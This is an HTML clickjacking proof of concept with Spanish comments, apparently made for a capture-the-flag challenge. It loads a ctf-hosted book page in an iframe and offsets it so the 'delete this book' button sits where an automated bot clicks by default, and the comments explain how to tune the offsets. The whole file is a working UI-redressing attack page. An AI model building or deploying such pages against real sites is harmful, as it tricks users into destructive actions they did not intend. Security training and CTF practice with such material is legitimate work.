<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Clickjacking</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        /* Contenedor para posicionar el iframe exactamente donde está el botón de borrar */
        .crop {
            position: absolute;
            /* Estos valores son críticos. Si el bot no clica, ajusta el TOP */
            top: 0px; 
            left: 0px;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        /* El iframe ES el botón objetivo para el bot */
        #objetivo {
            position: absolute;
            width: 100%;
            height: 2000px; /* Página completa */
            border: none;
            /* AJUSTE DE POSICIÓN: 
               Subimos la página para que el botón "Borrar este libro" 
               quede justo en la esquina superior izquierda, que es donde los bots suelen clicar por defecto si no especificas coordenadas */
            margin-top: -750px; 
            margin-left: -20px;
            /* Casi invisible pero 'existente' */
            opacity: 1; 
            z-index: 100;
        }
    </style>
</head>
<body>

    <div class="crop">
        <iframe id="objetivo" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
